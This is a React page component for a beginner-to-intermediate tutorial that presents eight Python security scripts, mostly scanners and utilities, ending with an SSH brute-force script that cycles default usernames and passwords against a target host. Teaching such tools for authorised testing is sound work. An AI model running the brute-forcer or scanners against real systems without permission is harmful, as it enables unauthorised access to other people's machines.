import GuideLayout from '@/components/GuideLayout';
export default function PythonSecurityPage() {
  return (
    <GuideLayout
      title="Python for Cybersecurity – 8 Security Scripts"
      description="Write Python cybersecurity scripts from scratch. Port scanner, hash generator, password generator, subdomain enumerator, brute forcer, and more."
      timeToRead="45 min read" lastUpdated="September 2026"
      tags={['Python','Security Scripts','Automation','Intermediate']}
      tools={[{name:'Hash Generator',url:'/tools/hash-generator'},{name:'Password Generator',url:'/tools/password-generator'},{name:'Port Scanner',url:'/tools/port-scanner'}]}
      relatedGuides={[{title:'Kali Linux Pentesting',url:'/guides/kali-linux-pentesting-tutorial'},{title:'CTF Walkthrough',url:'/guides/ctf-walkthrough-beginner'}]}
      headings={[{id:'prereqs',label:'Prerequisites'},{id:'s1',label:'Script 1: Port Scanner'},{id:'s2',label:'Script 2: Hash Generator'},{id:'s3',label:'Script 3: Password Generator'},{id:'s4',label:'Script 4: Subdomain Enum'},{id:'s5',label:'Script 5: Header Grabber'},{id:'s6',label:'Script 6: IP Range Scanner'},{id:'s7',label:'Script 7: URL Safety'},{id:'s8',label:'Script 8: SSH Brute Force'}]}
    >
      <h2 id="prereqs">Prerequisites</h2>
      <pre><code>{`# Python 3.8+ required
python3 --version

# Install dependencies
pip install requests paramiko dnspython colorama`}</code></pre>

      <h2 id="s1">Script 1: TCP Port Scanner</h2>
      <pre><code>{`import socket
import concurrent.futures

def scan_port(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((host, port))
        s.close()
        return port if result == 0 else None
    except:
        return None

host = input("Target IP: ")
ports = range(1, 1025)

print(f"Scanning {host}...")
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    results = list(executor.map(lambda p: scan_port(host, p), ports))

open_ports = [p for p in results if p]
for port in open_ports:
    print(f"[+] Port {port} OPEN")`}</code></pre>

      <h2 id="s2">Script 2: Hash Generator</h2>
      <pre><code>{`import hashlib

text = input("Enter text to hash: ").encode()

algorithms = ['md5', 'sha1', 'sha256', 'sha512']
for algo in algorithms:
    h = hashlib.new(algo, text).hexdigest()
    print(f"{algo.upper():12} {h}")`}</code></pre>

      <h2 id="s3">Script 3: Secure Password Generator</h2>
      <pre><code>{`import secrets
import string

def generate_password(length=16, use_symbols=True):
    chars = string.ascii_letters + string.digits
    if use_symbols:
        chars += "!@#$%^&*()-_=+[]{}|;:,.<>?"
    return ''.join(secrets.choice(chars) for _ in range(length))

length = int(input("Password length (default 16): ") or "16")
for i in range(5):
    print(f"  {generate_password(length)}")`}</code></pre>

      <h2 id="s4">Script 4: Subdomain Enumerator</h2>
      <pre><code>{`import dns.resolver
import concurrent.futures

SUBDOMAINS = ['www','mail','ftp','dev','api','admin','test',
              'staging','vpn','portal','remote','secure','app']

def check_subdomain(domain, sub):
    try:
        fqdn = f"{sub}.{domain}"
        answers = dns.resolver.resolve(fqdn, 'A')
        return fqdn, str(answers[0])
    except:
        return None

domain = input("Domain (e.g. example.com): ")
print(f"Enumerating subdomains of {domain}...")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(lambda s: check_subdomain(domain, s), SUBDOMAINS)

for r in results:
    if r:
        print(f"[+] {r[0]} → {r[1]}")`}</code></pre>

      <h2 id="s5">Script 5: HTTP Header Grabber</h2>
      <pre><code>{`import requests

url = input("Enter URL (with https://): ")
try:
    r = requests.head(url, timeout=5, allow_redirects=True)
    print(f"Status: {r.status_code}")
    print("Headers:")
    for k, v in r.headers.items():
        print(f"  {k}: {v}")
except Exception as e:
    print(f"Error: {e}")`}</code></pre>

      <h2 id="s6">Script 6: Ping Sweep (IP Range)</h2>
      <pre><code>{`import subprocess
import ipaddress
import concurrent.futures

def ping(ip):
    result = subprocess.run(
        ['ping', '-c', '1', '-W', '1', str(ip)],
        capture_output=True, text=True)
    return str(ip) if 'bytes from' in result.stdout else None

network = input("CIDR (e.g. 192.168.1.0/24): ")
hosts = list(ipaddress.ip_network(network, strict=False).hosts())

print(f"Scanning {len(hosts)} hosts...")
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    for result in executor.map(ping, hosts):
        if result:
            print(f"[UP] {result}")`}</code></pre>

      <h2 id="s7">Script 7: URL Safety Checker (URLhaus)</h2>
      <pre><code>{`import requests

url = input("URL to check: ")
resp = requests.post(
    "https://urlhaus-api.abuse.ch/v1/url/",
    data={"url": url},
    timeout=10
)
data = resp.json()

if data.get("query_status") == "is_listed":
    print(f"[!] MALICIOUS: {data.get('threat', 'unknown threat')}")
    print(f"    Tags: {', '.join(data.get('tags', []))}")
else:
    print("[✓] Not found in URLhaus database")`}</code></pre>

      <h2 id="s8">Script 8: SSH Brute Force (Authorised Testing Only)</h2>
      <div className="callout-warn"><strong>⚠️ Only use on systems you own or have written permission to test.</strong></div>
      <pre><code>{`import paramiko

host = input("Target IP: ")
users = ["admin", "root", "ubuntu", "pi"]
passwords = ["password", "123456", "admin", "raspberry", "letmein"]

for user in users:
    for pwd in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=user, password=pwd, timeout=3)
            print(f"[+] SUCCESS → {user}:{pwd}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {user}:{pwd}")
        except Exception as e:
            break`}</code></pre>

      <div className="callout-info">
        <strong>📚 More Scripts:</strong> <a href="https://github.com/ena1337/Python-for-Pentesters" target="_blank" rel="noopener noreferrer">Python for Pentesters (GitHub)</a> — 20+ additional security scripts.
      </div>
    </GuideLayout>
  );
}
